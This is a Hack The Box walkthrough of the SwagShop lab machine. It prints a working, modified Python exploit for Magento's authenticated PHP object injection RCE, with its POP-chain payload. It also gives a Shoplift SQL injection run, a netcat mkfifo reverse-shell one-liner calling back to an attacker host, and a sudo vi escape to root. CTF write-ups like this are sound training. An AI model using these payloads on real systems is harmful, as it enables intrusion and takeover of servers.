# Hack The Box - SwagShop Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.140
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 02:26 EST
Nmap scan report for 10.10.10.140
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6552bd24e8fa3817261379a12f624ec (RSA)
|   256 2e30007a92f0893059c17756ad51c0ba (ECDSA)
|_  256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/7%OT=22%CT=1%CU=37662%PV=Y%DS=2%DC=I%G=Y%TM=6406E727
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=101%GCD=1%ISR=107%TI=Z%CI=I%TS=8)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3
OS:=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.36 seconds
```

Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ rustscan -a 10.10.10.140 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.140:22
Open 10.10.10.140:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.10.140

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 02:27 EST
Initiating Ping Scan at 02:27
Scanning 10.10.10.140 [2 ports]
Completed Ping Scan at 02:27, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:27
Completed Parallel DNS resolution of 1 host. at 02:27, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:27
Scanning 10.10.10.140 [2 ports]
Discovered open port 22/tcp on 10.10.10.140
Discovered open port 80/tcp on 10.10.10.140
Completed Connect Scan at 02:27, 0.12s elapsed (2 total ports)
Nmap scan report for 10.10.10.140
Host is up, received syn-ack (0.20s latency).
Scanned at 2023-03-07 02:27:54 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

So, `nmap` and `rustscan` both found `2` open ports on the system.
- port `22`: running `OpenSSH 7.2`
- port `80`: running `Apache httpd 2.4.29`

## Enumeration.
Since, the version of OpenSSH seemed to be very recent, it might be secure, so I decided to start the enumeration by visiting the website on port `80`.

As soon as I visited the website, the url turned into `http://swagshop.htb` indicating that I need to add the domain to the list of hosts in `/etc/hosts`

```
echo "10.10.10.140  swagshop.htb" >> /etc/hosts
```

Visiting the web application, I found a e-commerce website.

![swg-1](https://user-images.githubusercontent.com/87711310/223354518-0bff0c51-d2d1-4370-9991-51f40d80f6b2.png)

On looking at the website carefully, I found out that it was running `Magneto`, which is an open-source e-commerce platform written in PHP. Considering that it is an off the shelf software, I’ll probably find reported vulnerabilities that are associated to it. But first, I need to get a version number. 

I noticed that at the bottom of the page, it has a copyright detailing the year 2014, so it’s very likely to be vulnerable.

But before looking for exploits, I decided to run `gobuster`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ gobuster dir  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -t 100  -u http://10.10.10.140/ -x php,txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.140/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/03/07 08:21:00 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 291]
/index.php            (Status: 302) [Size: 0] [--> http://swagshop.htb/]
/media                (Status: 301) [Size: 312] [--> http://10.10.10.140/media/]
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.140/includes/]
/lib                  (Status: 301) [Size: 310] [--> http://10.10.10.140/lib/]
/install.php          (Status: 200) [Size: 44]
/app                  (Status: 301) [Size: 310] [--> http://10.10.10.140/app/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.140/js/]
/api.php              (Status: 200) [Size: 37]
/shell                (Status: 301) [Size: 312] [--> http://10.10.10.140/shell/]
/skin                 (Status: 301) [Size: 311] [--> http://10.10.10.140/skin/]
/cron.php             (Status: 200) [Size: 0]
/LICENSE.txt          (Status: 200) [Size: 10410]
/var                  (Status: 301) [Size: 310] [--> http://10.10.10.140/var/]
/errors               (Status: 301) [Size: 313] [--> http://10.10.10.140/errors/]
/mage                 (Status: 200) [Size: 1319]
/.php                 (Status: 403) [Size: 291]
Progress: 262992 / 262995 (100.00%)
===============================================================
2023/03/07 08:26:37 Finished
===============================================================

```

I started with `/index.php` where I found the presence of `/admin` panel too.

![swg-2](https://user-images.githubusercontent.com/87711310/223371817-4755a8a7-30c4-41d5-805a-72d807518de7.png)

The directories, `/media`, `/includes`, `/lib`, `app`, `/js` and all the others were just dummy directories created to make a loophole.

Meanwhile, `/install.php` seemed to be just a checkup page.

![swg-3](https://user-images.githubusercontent.com/87711310/223436698-74304422-7b81-4a12-884a-eaf7de54d355.png)

`LINCENSE.txt` has this following text.

![swg-4](https://user-images.githubusercontent.com/87711310/223437015-b21ddff2-eaff-47d4-b6e1-bc58fca0f313.png)

Visiting the `/mage` directory, I found this script.

```php
#!/bin/sh

# REPLACE with your PHP5 binary path (example: /usr/local/php5/bin/php )
#MAGE_PHP_BIN="php"

MAGE_PHP_SCRIPT="mage.php"
DOWNLOADER_PATH='downloader'

# initial setup
if test "x$1" = "xmage-setup"; then
    echo 'Running initial setup...'

    if test "x$2" != "x"; then
        MAGE_ROOT_DIR="$2"
    else
        MAGE_ROOT_DIR="`pwd`"
    fi

    $0 config-set magento_root "$MAGE_ROOT_DIR"
    $0 config-set preferred_state beta
    $0 channel-add http://connect20.magentocommerce.com/community
    exit
fi

# check that mage pear was initialized

if test "x$1" != "xconfig-set" &&
  test "x$1" != "xconfig-get" &&
  test "x$1" != "xconfig-show" &&
  test "x$1" != "xchannel-add" &&
  test "x`$0 config-get magento_root`" = "x"; then
    echo 'Please initialize Magento Connect installer by running:'
    echo "$0 mage-setup"
    exit;
fi

# find which PHP binary to use
if test "x$MAGE_PHP_BIN" != "x"; then
  PHP="$MAGE_PHP_BIN"
else
  PHP=php
fi


# get default pear dir of not set
if test "x$MAGE_ROOT_DIR" = "x"; then
    MAGE_ROOT_DIR="`pwd`/$DOWNLOADER_PATH"
fi

exec $PHP -C -q $INCARG -d output_buffering=1 -d variables_order=EGPCS \
    -d open_basedir="" -d safe_mode=0 -d register_argc_argv="On" \
    -d auto_prepend_file="" -d auto_append_file="" \
    $MAGE_ROOT_DIR/$MAGE_PHP_SCRIPT "$@"
```

I didn't anything that would be particularly helpful from gobuster search. So, I decided to move on.

Just like there is a scanner for WordPress applications (WPScan), there is one for Magento applications that is called [Mage Scan](https://github.com/steverobbins/magescan).

So, I downloaded the script, and ran it on the machine.

```
php magescan.phar -vvv scan:all 10.10.10.140 > output
```

I got back the following results.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ php magescan.phar -vvv scan:all 10.10.10.140
Scanning http://10.10.10.140/...
     
  Magento Information  
+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+
                
  Installed Modules   
No detectable modules were found

                       
  Catalog Information  
+------------+---------+
| Type       | Count   |
+------------+---------+
| Categories | Unknown |
| Products   | Unknown |
+------------+---------+
   
  Patches  
+------------+---------+
| Name       | Status  |
+------------+---------+
| SUPEE-5344 | Unknown |
| SUPEE-5994 | Unknown |
| SUPEE-6285 | Unknown |
| SUPEE-6482 | Unknown |
| SUPEE-6788 | Unknown |
| SUPEE-7405 | Unknown |
| SUPEE-8788 | Unknown |
+------------+---------+
           
  Sitemap          
Sitemap is not declared in robots.txt
Sitemap is not accessible: http://10.10.10.140/sitemap.xml
                     
  Server Technology                       
+--------+------------------------+
| Key    | Value                  |
+--------+------------------------+
| Server | Apache/2.4.18 (Ubuntu) |
+--------+------------------------+
```

Mage Scan reports the Magneto version being `1.9.0` or `1.9.1` and that the website is using the Community Edition. There are no installed modules, so if  any public vulnerabilities that are associated to modules, can be discard. As for the unreachable path check, the last two paths don’t give us anything useful. However, the first path, gave an xml file that leaks the swagshop mysql database username and password.

![swg-5](https://user-images.githubusercontent.com/87711310/223441506-bc0f4161-ecf4-4314-a006-e4837e0c12a9.png)

I tried this credentials at the `/index.php/admin` page that I found but it didn't work.

Next, looking at both Google and searchsploit, I found a bunch of exploits for Magento. First, I used one called [shoplift](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py) exploit to add an admin user. I downloaded the python script and ran it:

NOTE: This is a deprecated script and it uses SQL-Injection to create a username and password that could be used to log in through the `index.php/admin` panel.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ python2 shoplift-poc.py 10.10.10.140
WORKED
Check http://10.10.10.140/admin with creds ypwq:123
```
NOTE: This is a deprecated script and it uses SQL-Injection to create a username and password that could be used to log in through the `index.php/admin` panel. Ignore the `http://10.10.10.140/admin` cause it wont work there.

I was able to verify these creds by logging in at `http://10.10.10.140/index.php/admin`:

![swg-6](https://user-images.githubusercontent.com/87711310/223443159-1bd6fbea-54bf-40e1-8886-7f2b72174fee.png)


Now that I was an authenticated as administer, there’s another exploit that I found with searchsploit:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ searchsploit magento
----------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                  |  Path
----------------------------------------------------------------------------------------------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                    | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)         | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' XSS               | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' XSS         | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                       | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                  | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                    | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                       | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                       | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                     | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                          | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                     | php/webapps/35052.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                    | php/webapps/48135.php
------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results

```

After looking through these, the `authenticated RCE python` script looked the most interesting.

For background on this bug, it’s a PHP Object Injection vulnerability, detailed by one of the researchers who found it here. `PHP Object Injection` is a class of bugs that falls under deserialization vulnerabilities. Basically, the server passes a `php object` into the page, and when the browser submits back to the server, it sends that object as a parameter. To prevent evil users from messing with the object, Magento uses a keyed hash to ensure integrity. However, the key for the hash is the install data, which can be retrieved from `/app/etc/local.xml`. This means that once I have that date, I can forge signed objects and inject my own code, which leads to RCE.


I made a copy of the POC from `searchsploit`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ searchsploit -m exploits/php/webapps/37811.py
  Exploit: Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37811
     Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
    Codes: OSVDB-126445
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/Desktop/HackTheBox/Linux-Boxes/SwagShop/37811.py
```

I renamed it to `magento_rce.py`, and open it up and take a look. In the config section, I had to update 3 fields:

```
# Config.
username = 'ypwq'
password = 'qwe'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

I got the date from the page as suggested:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ curl -s 10.10.10.140/app/etc/local.xml | grep date
            <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>
```

Now, when I ran it, I got an error:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ python magento_rce.py  http://10.10.10.140/index.php "whoami"
Traceback (most recent call last):
  File "/home/kali/Desktop/HackTheBox/Linux-Boxes/SwagShop/magento_rce.py", line 56, in <module>
    br['login[password]'] = password
  File "/usr/lib/python3/dist-packages/mechanize/_mechanize.py", line 809, in __setitem__
    self.form[name] = val
  File "/usr/lib/python3/dist-packages/mechanize/_form_controls.py", line 1963, in __setitem__
    control = self.find_control(name)
  File "/usr/lib/python3/dist-packages/mechanize/_form_controls.py", line 2355, in find_control
    return self._find_control(name, type, kind, id, label, predicate, nr)
  File "/usr/lib/python3/dist-packages/mechanize/_form_controls.py", line 2448, in _find_control
    raise ControlNotFoundError("no control matching " + description)
mechanize._form_controls.ControlNotFoundError: no control matching name 'login[password]'
```


`mechanize` is a scriptable browser, and it’s complaining that there’s not login form with a password field. That’s because it’s trying to log into the base of the site. I’ll run it again, this time with the admin login page:

But it still gave me an error. I got a `mechanize._form_controls.ControlNotFoundError`. 

After spending some time googling the error, I found a [post](https://stackoverflow.com/questions/35226169/clientform-ambiguityerror-more-than-one-control-matching-name) on stackoverflow stating that the issue is that `there is only one form from the code provided and multiple username, passwords fields which is where the Ambiguous error comes from`. Therefore, I  need to use and index parameter for selecting the form.

Make the following changes to the code.

```
#Comment out the following code

br.select_form(nr=0)
#br.form.new_control('text', 'login[username]', {'value': username})  
#br.form.fixup()
#br['login[username]'] = username
#br['login[password]'] = password

#Add the following code instead
userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwone = br.find_control(name="login[password]", nr=0)
pwone.value = password
```

I ran it again, and this time I got back a different error.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ python 37811.py 'http://10.10.10.140/index.php/admin' "uname -a"
Traceback (most recent call last):
  File "/home/kali/Desktop/HackTheBox/Linux-Boxes/SwagShop/37811.py", line 66, in <module>
    url = re.search("ajaxBlockUrl = \'(.*)\'", content)
  File "/usr/lib/python3.10/re.py", line 200, in search
    return _compile(pattern, flags).search(string)
TypeError: cannot use a string pattern on a bytes-like object
```

Finally after a ton modification to the exploit and spending couple of hours, I was able to modify the exploit correctly to give me the required results.

```python

from hashlib import md5
import sys
import re
import base64
import mechanize


def usage():
    print("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"")
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'ypwq'
password = '123'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
install_date = bytes(install_date, 'utf-8')

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)

payload = payload.encode("ascii")
# Setup the mechanize browser and options
br = mechanize.Browser()
#br.set_proxies({"http": "localhost:8080"})
#br.set_handle_robots(False)

request = br.open(target)
br.select_form(nr=0)
userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwone = br.find_control(name="login[password]", nr=0)
pwone.value = password

br.method = "POST"
request = br.submit()
content = request.read()

url = re.search("ajaxBlockUrl = \'(.*)\'", content.decode("utf-8"))
url = url.group(1)

key = re.search("var FORM_KEY = '(.*)'", content.decode("utf-8"))
key = key.group(1)

request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read().decode("utf-8"))
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
#payload = payload.decode("ascii")

#print("type check", type(payload))
gh = md5(payload + install_date).hexdigest()

payload = payload.decode()
exploit = tunnel + '?ga=' + payload + '&h=' + gh


try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print(e.read().decode())

```

__NOTE__: If you're getting an error while running the code from the searchsploit module, it's probably because some part of the code is in bytes while the other part of the code is in strings. It took a lot of time for me to figure this out. The most important thing is, use `'http://swagshop/index.php/admin'` instead of `http://10.10.10.140/index.php/admin'` or else you'll get error for the `group` function. Just use the above mentioned script to avoid any such issues.

Now that the script was working fine, I ran it to get the `id` of the machine.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ python magento_rce-2.py http://swagshop.htb/index.php/admin "id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then, I used this script to get a reverse shell to my machine.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ python magento_rce.py 'http://10.10.10.140/index.php/admin' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f" 
```

Started a `netcat` listener on port `4444`

```
nc -lvnp 4444
```

And got back a shell instantly.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/SwagShop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.140] 54634
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Upgrading the shell using python, but I wasn't able to upgrade it.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
$ which python
```

Grabbing the user flag.

```
$ pwd
/var/www/html
$ cd ../../..
$ cd home
ls$ 
haris
$ cd haris
$ ls
user.txt
$ cat user.txt
[REDACTED]
```

# Privilege Escalation
`sudo -l` shows I can run sudo with no password on `vi` in the `web dir`:


```
$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

The fastest path to the flag is just to open it with `vi`. Based on the sudo output above, I’ll run:
```
$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'
[REDACTED]

```

Of course I want a shell. so I opened a non-existing file with 
```www-data@swagshop:/home/haris$ sudo /usr/bin/vi /var/www/html/a```

Added the following code into the file.

```
:set shell=/bin/sh
:shell
```

And we get a root shell
```
root@swagshop:/home/haris# cat /root/root.txt 
[REDACTED]

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
```
